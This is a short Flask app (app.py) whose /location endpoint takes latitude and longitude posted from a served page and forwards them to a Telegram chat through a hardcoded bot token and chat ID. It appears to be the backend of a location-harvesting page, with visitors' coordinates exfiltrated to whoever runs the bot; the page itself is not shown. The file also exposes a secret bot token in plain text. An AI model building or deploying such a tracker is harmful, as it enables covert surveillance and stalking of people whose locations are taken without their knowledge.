# app.py
from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0'
CHAT_ID = '7485197107'

@app.route('/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    lat = data.get('lat')
    lon = data.get('lon')

    text = f"📍 موقع جديد:\nLatitude: {lat}\nLongitude: {lon}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={'chat_id': CHAT_ID, 'text': text})
    return {'status': 'ok'}

@app.route('/')
def index():
    return open("index.html").read()

if __name__ == '__main__':
    app.run()
